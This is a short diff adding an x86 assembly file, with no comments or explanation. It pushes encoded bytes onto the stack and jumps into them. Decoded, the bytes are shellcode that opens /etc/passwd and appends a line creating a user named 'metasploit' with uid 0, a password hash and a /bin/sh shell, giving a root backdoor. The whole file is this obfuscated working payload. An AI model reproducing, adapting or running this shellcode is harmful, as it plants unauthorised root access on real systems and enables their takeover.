@@ -1,0 +1,29 @@
+section .text
+	global _start
+_start:
+	push 0x90909080
+	push 0xcd58016a
+	push 0x80cd5804
+	push 0x6afc518b
+	push 0x590a6873
+	push 0x2f6e6962
+	push 0x2f3a2f3a
+	push 0x3a303a30
+	push 0x3a635249
+	push 0x3470346a
+	push 0x7349642f
+	push 0x7a413a74
+	push 0x696f6c70
+	push 0x73617465
+	push 0x6d000000
+	push 0x28e89380
+	push 0xcd04b541
+	push 0xe3896374
+	push 0x652f6861
+	push 0x702f2f68
+	push 0x64777373
+	push 0x6851c931
+	push 0x58056a80
+	push 0xcd58466a
+	push 0xcb89c931
+	jmp esp
